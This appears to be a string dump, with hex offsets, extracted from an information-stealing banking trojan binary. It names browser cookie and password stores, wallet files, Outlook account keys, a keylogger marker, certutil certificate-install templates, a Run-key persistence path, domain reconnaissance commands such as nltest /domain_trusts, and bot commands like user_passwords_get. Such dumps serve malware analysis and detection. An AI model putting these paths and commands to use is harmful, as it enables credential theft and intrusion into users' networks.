66a10,"*wallet.dat"
65ef4,": "
65ef4,": "
65ef4,": "
65ef4,": "
65efa,"%u"
65890,"[VK_BACK]"
652e0,"\Google\Chrome\User Data"
64cda,"\*"
66682,"Cookies"
666a0,"Chrome cookies was not found, \""
65384,"\"."
66ae0,"cmd.exe /c ipconfig /all"
66b20,">> ipconfig /all\n"
66b50,"cmd.exe /c net config workstation"
66ba0,">> net config workstation\n\n"
66be0,"cmd.exe /c net view /all"
66c20,">> net view /all\n\n"
66c50,"cmd.exe /c net view /all /domain"
66ca0,">> net view /all /domain\n\n"
66ce0,"cmd.exe /c nltest /domain_trusts"
66d30,"nltest /domain_trusts\n"
66d60,"cmd.exe /c nltest /domain_trusts /all_trusts"
66dc0,"nltest /domain_trusts /all_trusts\n"
65250,"Url: %s\n"
65262,"%S"
65270,"Data: %S"
66a70,"Windows\"
66a90,"Program Files\"
66ab0,"Program Files (x86)\"
665b0,"firefox.exe"
665d0,"Started \""
65384,"\"."
665b0,"firefox.exe"
6665c,"Firefox"
66670,"Finish \""
65384,"\"."
65416,".tmp"
65290,"Grabbed data from: %s\n\n%S"
66a28,".txt"
66a32,".docx"
66a3e,".xls"
66a50,"wallet.dat"
66480,"iexplore.exe"
66940,"%s\System32\kernel32.dll"
66980,"%s\System32\kernelbase.dll"
64f70,"ntdll.dll"
667a0,"explorer.exe"
66480,"iexplore.exe"
665b0,"firefox.exe"
65400,"chrome.exe"
65672,".dll"
65680,"\"%s\",DllRegisterServer"
656b0,"rundll32.exe"
66448,"*.txt"
66460,"*.cookie"
66480,"iexplore.exe"
6649a,"Low"
664b0,"Internet Explorer"
668e0,"Unknown-Title"
64f70,"ntdll.dll"
66850,"user32.dll"
65400,"chrome.exe"
65400,"chrome.exe"
665d0,"Started \""
65384,"\"."
65400,"chrome.exe"
653f0,"Chrome"
66670,"Finish \""
65384,"\"."
667a0,"explorer.exe"
64fe0,"\Mozilla\Firefox\Profiles"
64cda,"\*"
66540,"cookies.sqlite"
66560,"Firefox cookies was not found, \""
65384,"\"."
65052,"\"
65060,"\prefs.js"
665b0,"firefox.exe"
65672,".dll"
656ca,".exe"
656e0,"rundll32.exe \"%s\",DllRegisterServer"
64fcc,".crt"
64fe0,"\Mozilla\Firefox\Profiles"
65020,"cert9.db"
65040,"cert8.db"
65416,".tmp"
658e0,"LoadSql() failed."
64d04,"Global\"
64d14,"Local\"
658b0,"Software\Microsoft\"
658b0,"Software\Microsoft\"
65a90,"Software\Microsoft"
65a90,"Software\Microsoft"
662c0,"C:\Windows\SystemApps\*"
662f0,"Microsoft.MicrosoftEdge"
65f00,"Software\Microsoft\Internet Account Manager\Accounts"
65f00,"Software\Microsoft\Internet Account Manager\Accounts"
65f70,"Identities"
65f90,"Software\Microsoft\Internet Account Manager"
65fe8,"Outlook"
66000,"\Accounts"
66020,"Software\Microsoft\Office\Outlook\OMI Account Manager\Accounts"
660a0,"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings"
66190,"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook"
66250,"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook"
65fe8,"Outlook"
65ac0,"Software\Microsoft\Windows\CurrentVersion\Run"
658b0,"Software\Microsoft\"
657f0,"SYSTEM\CurrentControlSet\Control\TimeZoneInformation"
65860,"TimeZoneKeyName"
65880,"Unknown"
65540,"user_execute"
65560,"bot_uninstall"
65580,"user_cookies_get"
655b0,"user_cookies_remove"
655e0,"user_passwords_get"
65610,"user_files_get"
65630,"user_url_block"
65650,"user_url_unblock"
64cd2,"0:0"
65080,"\certutil.exe"
65020,"cert9.db"
650a0,"\"%s\" -A -n \"%s\" -t \"C,C,C\" -i \"%s\" -d \"%s\""
65100,"\"%s\" -A -n \"%s\" -t \"C,C,C\" -i \"%s\" -d sql:\"%s\""
64f70,"ntdll.dll"
65416,".tmp"
65416,".tmp"
652e0,"\Google\Chrome\User Data"
64cda,"\*"
65320,"Login Data"
65340,"Chrome passwords was not found, \""
65384,"\"."
65400,"chrome.exe"
653f0,"Chrome"
64eb0,"%s\mozilla\firefox\profiles\*"
64ef0,"%s\mozilla\firefox\profiles\%s\cache2\entries"
64e40,"\Google\Chrome\User Data\Default\Cache"
64e90,"%s\index"
64f50,"\mshtml.dll"
64f70,"ntdll.dll"
64d50,"S:(ML;;NRNWNX;;;LW)"
64d34,"\"%s\" %s"
64d2a,"\"%s\""
64d22,"%s|"
64cda,"\*"
64cda,"\*"
64ce0,"*"
65052,"\"
65052,"\"
65052,"\"
